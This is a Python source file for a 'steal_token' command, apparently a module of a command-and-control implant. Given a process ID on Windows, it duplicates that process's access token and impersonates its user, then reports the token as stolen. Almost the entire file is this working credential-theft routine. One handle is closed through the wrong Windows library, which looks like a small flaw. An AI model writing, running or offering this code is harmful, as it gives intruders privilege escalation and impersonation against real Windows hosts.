import ctypes
import platform
from Models.Command import Command
from Models.Task import Task


class StealTokenCommand(Command):
    def __init__(self):
        self.name = "steal_token"

    def execute(self, task: Task) -> str:
        if platform.system() != "Windows":
            return "Error: steal_token is only supported on Windows"

        arguments = task.get_arguments()
        if not arguments or not arguments[0]:
            return "Error: PID required"

        try:
            pid = int(arguments[0])
        except ValueError:
            return "Error: invalid PID"

        PROCESS_QUERY_INFORMATION = 0x0400
        TOKEN_DUPLICATE            = 0x0002
        TOKEN_QUERY                = 0x0008
        TOKEN_ALL_ACCESS           = 0xF01FF
        SecurityImpersonation      = 2
        TokenImpersonation         = 2

        kernel32  = ctypes.windll.kernel32
        advapi32  = ctypes.windll.advapi32

        hProcess = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
        if not hProcess:
            return f"Error: OpenProcess failed (code {ctypes.GetLastError()})"

        hToken = ctypes.c_void_p()
        if not advapi32.OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, ctypes.byref(hToken)):
            kernel32.CloseHandle(hProcess)
            return f"Error: OpenProcessToken failed (code {ctypes.GetLastError()})"
        kernel32.CloseHandle(hProcess)

        hDupToken = ctypes.c_void_p()
        ok = advapi32.DuplicateTokenEx(
            hToken, TOKEN_ALL_ACCESS, None,
            SecurityImpersonation, TokenImpersonation,
            ctypes.byref(hDupToken),
        )
        advapi32.CloseHandle(hToken)
        if not ok:
            return f"Error: DuplicateTokenEx failed (code {ctypes.GetLastError()})"

        ok = advapi32.ImpersonateLoggedOnUser(hDupToken)
        kernel32.CloseHandle(hDupToken)
        if not ok:
            return f"Error: ImpersonateLoggedOnUser failed (code {ctypes.GetLastError()})"

        return f"Stolen token from PID {pid} — now impersonating"
